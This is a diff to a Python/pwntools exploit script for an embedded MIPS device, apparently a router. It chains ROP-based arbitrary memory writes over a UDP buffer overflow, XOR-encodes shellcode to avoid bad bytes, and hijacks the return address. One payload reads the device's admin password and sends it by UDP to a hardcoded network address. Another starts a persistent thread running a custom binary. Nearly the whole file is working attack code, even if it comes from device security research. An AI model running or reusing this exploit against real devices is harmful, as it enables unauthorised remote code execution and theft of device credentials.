@@ -6,6 +6,7 @@ from cmds import command_dict
 import time
 import struct
 from pwn import *
+import os
 
 from rop_payload_generators import *
 
@@ -233,13 +234,17 @@ def crack_password(wordlist):
 
 
 def write_memory(ip, addr, value):
-    # Create the payload
-    payload = rop_arbitrary_write(addr, value)
+    last_byte = addr & 0xFF
+    # Create payload, if the address ends in 0x00, use the alternate gadget to write
+    if last_byte == 0x00:
+        payload = rop_arbitrary_write_0_in_addr(addr, value)
+    else:
+        payload = rop_arbitrary_write(addr, value)
 
     # Build the request
     request = create_overflow_request(payload)
 
-    print(f"Writing {hex(value)} to address {hex(addr)}")
+    info(f"Writing {hex(value)} to address {hex(addr)}")
     
     # Create socket and connect
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -250,7 +255,7 @@ def write_memory(ip, addr, value):
     s.sendall(request)
     s.close()  
 
-    time.sleep(0.1)
+    time.sleep(0.05)
 
 # construct argparse
 parser = argparse.ArgumentParser(
@@ -400,7 +405,7 @@ elif args.command == 'http':
 
             # Build the request
             request = b"POST / HTTP/1.1\r\n"
-            request += b"User-Agent: MozillaFirefox\r\n\r\n"
+            request += b"User-Agent: MozillaQIHU\r\n\r\n"
             
             # Create socket and connect
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -565,7 +570,10 @@ elif args.command == 'http':
         /* do some branch stuff if s2 is 0 */
         bgtz $s2, loop;
         addiu $s1, $s1, -0x104;
-        /* fix v0 (in branch delay slot) */
+        ''')
+
+        fix_shellcode = asm('''
+        /* fix v0 */
         xor $v0, $s3, $s3;
         /* fix s0 (0x802c0404) */
         lui $t0, 0x802c;
@@ -584,13 +592,16 @@ elif args.command == 'http':
         addiu $sp, $sp, -0xfef;
         ''')
 
+        decoder_addr = 0x8026b7a4
+        fixer_addr = decoder_addr + len(decode_shellcode)
+
         if args.shellcode[0] == '1': # print string to uart
-            test_shellcode = asm('''
+            test_shellcode = asm(f'''
             move $a0, $s2;
             move $a1, $s1;
             jalr $s3;
             nop;
-            j 0x802C3638;   /* fix address */
+            j {fixer_addr};   /* fix address */
             xor $v0, $s3, $s3;
             ''')
 
@@ -599,42 +610,119 @@ elif args.command == 'http':
             s2 = 0x801c3f91 # %s address
             s3 = 0x8019a3a0 # printf address
         elif args.shellcode[0] == '2': # send admin password to device listening on network
-            test_shellcode = asm('''
-            lw $a0, ($s1);      /* s1 contains address of 0x1010200 */
-            lui $v0, 0x8000;
-            or $v0, 0x89e4;
-            jalr $v0;           /* config_get(0x1010200 (*0x80236c4c), pwd_buffer (0x801d3754)) */
-            move $a1, $s2;      /* s2 contains pwd buffer address */
-            jalr $s0;           /* len = strlen(pwd_buffer (0x801d3754)) */
-            move $a0, $s2;      /* s2 contains pwd buffer address */
-            move $s0, $v0;      /* v0 contains length of password */
+            test_shellcode = asm(f'''
+            lw $a0, ($s1)      /* s1 contains address of 0x1010200 */
+            li $v0, 0x800089e4
+            jalr $v0           /* config_get(0x1010200 (*0x80236c4c), pwd_buffer (0x801d3754)) */
+            move $a1, $s2      /* s2 contains pwd buffer address */
+            jalr $s0           /* len = strlen(pwd_buffer (0x801d3754)) */
+            move $a0, $s2      /* s2 contains pwd buffer address */
+            move $s0, $v0      /* v0 contains length of password */
             /* create sockaddr stuff and put into t0 */
-            lui $v0, 0x800f;
-            or $v0, $v0, 0x9528;
-            lw $v0, ($v0);      /* load value of hardcoded_afinet into v0 */
-            lui $t0, 0x802a;
-            or $s1, $t0, 0xbf10;
-            sw $v0, ($s1);      /* save hardcoded_afinet value to address of sockaddr */
-            addiu $t0, $s1, 0x4;
-            lui $v0, 0x02bc;
-            or $v0, $v0, 0xa8c0;
-            sw $v0, ($t0);      /* save hardcoded IP address to sockaddr + 4 */
-            addiu $a0, $zero, 2;
-            addiu $a1, $zero, 2;
-            jalr $s3;           /* socket(2, 2, 0) - s3 contains address of socket()*/
-            move $a2, $zero;
-            move $a0, $v0;      /* v0 contains sockfd_address */
-            move $a1, $s2;      /* s2 contains pwd buffer address */
-            move $a2, $s0;      /* s0 contains pwd length */
-            move $a3, $zero;
-            move $t0, $s1;      /* s1 contains the address of sockaddr */
-            lui $v0, 0x8012;
-            or $v0, $v0, 0x8bc4;
-            jalr $v0;           /* sendto(sockfd_addr (0x802ab9b0), pwd_buffer (0x801d3754), len, 0, sockaddr_addr (0x802ab980), 0x20); */
-            addiu $t1, $zero, 0x20;
-            j 0x802C3638;   /* fix address */
-            xor $v0, $s3, $s3;
+            li $v0, 0x800f9528
+            lw $v0, ($v0)      /* load value of hardcoded_afinet into v0 */
+            li $t0, 0x802abf10
+            sw $v0, ($s1)      /* save hardcoded_afinet value to address of sockaddr */
+            addiu $t0, $s1, 0x4
+            li $v0, 0x02bca8c0
+            sw $v0, ($t0)      /* save hardcoded IP address to sockaddr + 4 */
+            addiu $a0, $zero, 2
+            addiu $a1, $zero, 2
+            jalr $s3           /* socket(2, 2, 0) - s3 contains address of socket()*/
+            move $a2, $zero
+            move $a0, $v0      /* v0 contains sockfd_address */
+            move $a1, $s2      /* s2 contains pwd buffer address */
+            move $a2, $s0      /* s0 contains pwd length */
+            move $a3, $zero
+            move $t0, $s1      /* s1 contains the address of sockaddr */
+            li $v0, 0x80128bc4
+            jalr $v0           /* sendto(sockfd_addr (0x802ab9b0), pwd_buffer (0x801d3754), len, 0, sockaddr_addr (0x802ab980), 0x20); */
+            addiu $t1, $zero, 0x20
+            j {fixer_addr}   /* fix address */
+            xor $v0, $s3, $s3
             ''')
+
+            s0 = 0x801a717c # config_get address
+            s1 = 0x80236c4c # address of 0x1010200
+            s2 = 0x801d3754 # address of pwd buffer
+            s3 = 0x801293d0 # address of socket function
+        elif args.shellcode[0] == '3': # This spins up a thread called 'hello' that prints 'hello' every second
+            create_thread_function_addr = 0x8019acb0
+            resume_thread_function_addr = 0x8019abec
+
+            # This is the main shellcode that will be executed to spin up the thread
+            test_shellcode_p2 = asm(f'''
+            /* create_thread(int id, void* thread_function, int priority, char* name) */
+            li $a0, 0x10         /* priority */
+            /* loading of a1 done later on as need to know the length of this to insert into the shellcode */
+            li $a2, 0x0         /* entry_data */
+            li $a3, 0x801d3754  /* thread name */
+            li $t0, 0x80295680  /* stack base */
+            li $t1, 0x800       /* stack size */
+            li $t2, 0x802955f8  /* thread handle */
+            li $t3, 0x80295500  /* thread itself */
+            li $v0, {create_thread_function_addr}
+            jalr $v0
+            nop
+            li $a0, 0x802955f8  /* thread handle */
+            lw $a0, ($a0)
+            li $v0, {resume_thread_function_addr}
+            jalr $v0
+            nop
+            /* printf("started") */
+            li $a0, 0x801ea85f
+            li $v0, 0x8019a3a0
+            jalr $v0
+            nop
+            j {fixer_addr}   /* fix address */
+            nop''')
+
+            # Calculate the position of the function in memory
+            custom_thread_function_location = decoder_addr + len(decode_shellcode) +  len(fix_shellcode) + len(test_shellcode_p2) + 8 # 8 because li is a pseudo-instruction that is actually 2 instructions
+
+            info(f"Custom function location: {hex(custom_thread_function_location)}")
+
+            # os.system('mipsel-unknown-elf-gcc Shellcodes/blackjack.c Shellcodes/Init.S -nostdlib -Wl,-T,Shellcodes/Linker.ld -o Shellcodes/blackjack.elf -Os -ffunction-sections -fdata-sections -Wl,--gc-sections -s')
+            # os.system('mipsel-unknown-elf-objcopy -O binary Shellcodes/blackjack.elf Shellcodes/blackjack.bin')
+
+            with open('Shellcodes/blackjack.bin', 'rb') as file:
+                custom_function = file.read()
+                info(f"Length of custom function is {len(custom_function)}")
+
+            # This is the custom function our thread will be running
+            # custom_function = asm('''
+            # /* our custom function loop */
+            # infinite:
+            # /* printf("hello") */
+            # li $a0, 0x801d3754
+            # li $v0, 0x8019a3a0
+            # jalr $v0
+            # nop
+            # /* sleep(100) */
+            # li $a0, 100
+            # li $v0, 0x8019abac
+            # jalr $v0
+            # nop
+            # b infinite
+            # nop
+            # ''')
+
+            # Construct final shellcode
+            test_shellcode = asm(f'''
+            li $a1, {custom_thread_function_location}  /* custom thread entry point function */
+            ''') + test_shellcode_p2 + custom_function
+
+            s0 = 0x802c0404 # config_get address
+            s1 = 0x8025d504 # address of 0x1010200
+            s2 = 0x802C5268 # address of pwd buffer
+            s3 = 0x802ab9f4 # address of socket function
+        elif args.shellcode[0] == 't': # use an add to check how viable an area is for executing code
+            plus = asm('''
+                addiu $s0, $s0, 0x1
+                ''')
+
+            for i in range(200):
+                test_shellcode += plus
 
             s0 = 0x801a717c # config_get address
             s1 = 0x80236c4c # address of 0x1010200
@@ -644,38 +732,79 @@ elif args.command == 'http':
             print("[-] Bad type")
             exit(1)
 
+        byte_key = -1
+        # Determine a good key 
+        for i in range(255):
+            badchar_detected = False
+            if (i not in test_shellcode):
+                for j in test_shellcode:
+                    val = (j ^ i).to_bytes(1, 'big')
+                    if ((val == b'\x0a') or (val == b'\x00')):
+                        badchar_detected = True
+                        break
+                if (badchar_detected == False):        
+                    byte_key = i
+
+        if (byte_key == -1):
+            printf("NO KEYS AVAILABLE")
+            exit(0)
+        else:
+            print(f"Found XOR key: {hex(byte_key)}")
+
+        xor_key = (byte_key << 24) | (byte_key << 16) | (byte_key << 8) | (byte_key)
+
         # Write our shellcode to memory with a bunch of overflows
-        decoder_addr = 0x802c3614
-        shellcode_addr = decoder_addr + len(decode_shellcode)
-
-        # Write decoder shellcode
-        for i in range(int(len(decode_shellcode)/4)):
-            pos = i * 4
-            write_memory(args.ip, decoder_addr + (i * 4), (decode_shellcode[pos]) | (decode_shellcode[pos + 1] << 8) | (decode_shellcode[pos + 2] << 16) | (decode_shellcode[pos + 3] << 24))
-            write_memory(args.ip, decoder_addr + (i * 4), (decode_shellcode[pos]) | (decode_shellcode[pos + 1] << 8) | (decode_shellcode[pos + 2] << 16) | (decode_shellcode[pos + 3] << 24))
-
-        for i in range(int(len(test_shellcode)/4)):
-            pos = i * 4
-            write_memory(args.ip, shellcode_addr + (i * 4), ((test_shellcode[pos]) | (test_shellcode[pos + 1] << 8) | (test_shellcode[pos + 2] << 16) | (test_shellcode[pos + 3] << 24)) ^ 0xf6f6f6f6)
-            write_memory(args.ip, shellcode_addr + (i * 4), ((test_shellcode[pos]) | (test_shellcode[pos + 1] << 8) | (test_shellcode[pos + 2] << 16) | (test_shellcode[pos + 3] << 24)) ^ 0xf6f6f6f6)
+        shellcode_addr = decoder_addr + len(decode_shellcode) + len(fix_shellcode)
 
         print(f"Decoder address: {hex(decoder_addr)}")
+        print(hexdump(decode_shellcode))
+        print(f"Fixer address: {hex(fixer_addr)}")
         print(hexdump(decode_shellcode))
         print(f"Shellcode address: {hex(shellcode_addr)}")
         print(hexdump(test_shellcode))
         print(f"Encoded shellcode:")
         encoded_shellcode = b''
+        key = xor_key >> 24
+        badchar_detected = False
         for i in test_shellcode:
-            encoded_shellcode += (i ^ 0xf6).to_bytes(1, 'big')
+            val = (i ^ key).to_bytes(1, 'big')
+            if ((val == b'\x0a') or (val == b'\x00')):
+                info(f"Detected badchar :( {val}")
+                badchar_detected = True
+            encoded_shellcode += val
         print(hexdump(encoded_shellcode))
+
+        if (badchar_detected):
+            print("Badchar detected")
+            exit(0)
+
+        # Write decoder shellcode
+        for i in range(int(len(decode_shellcode) / 4)):
+            pos = i * 4
+            write_memory(args.ip, decoder_addr + (i * 4), (decode_shellcode[pos]) | (decode_shellcode[pos + 1] << 8) | (decode_shellcode[pos + 2] << 16) | (decode_shellcode[pos + 3] << 24))
+            write_memory(args.ip, decoder_addr + (i * 4), (decode_shellcode[pos]) | (decode_shellcode[pos + 1] << 8) | (decode_shellcode[pos + 2] << 16) | (decode_shellcode[pos + 3] << 24))
+
+        # Write fixer shellcode
+        for i in range(int(len(fix_shellcode) / 4)):
+            pos = i * 4
+            write_memory(args.ip, fixer_addr + (i * 4), (fix_shellcode[pos]) | (fix_shellcode[pos + 1] << 8) | (fix_shellcode[pos + 2] << 16) | (fix_shellcode[pos + 3] << 24))
+            write_memory(args.ip, fixer_addr + (i * 4), (fix_shellcode[pos]) | (fix_shellcode[pos + 1] << 8) | (fix_shellcode[pos + 2] << 16) | (fix_shellcode[pos + 3] << 24))
+
+        # Write payload
+        for i in range(int(len(test_shellcode) / 4)):
+            pos = i * 4
+            write_memory(args.ip, shellcode_addr + (i * 4), ((test_shellcode[pos]) | (test_shellcode[pos + 1] << 8) | (test_shellcode[pos + 2] << 16) | (test_shellcode[pos + 3] << 24)) ^ xor_key)
+            write_memory(args.ip, shellcode_addr + (i * 4), ((test_shellcode[pos]) | (test_shellcode[pos + 1] << 8) | (test_shellcode[pos + 2] << 16) | (test_shellcode[pos + 3] << 24)) ^ xor_key)
+
+        
 
         #### Now call the decoder shellcode
         payload = b'b' * 132
 
         payload += p32(0x802c0404) # s0
         payload += p32(shellcode_addr - 0x1010) # s1
-        payload += p32(len(test_shellcode) ^ 0xf6f6f6f6) # s2
-        payload += p32(0xf6f6f6f6) # s3
+        payload += p32(len(test_shellcode) ^ xor_key) # s2
+        payload += p32(xor_key) # s3
         payload += p32(decoder_addr) # ra
 
         # Build the request
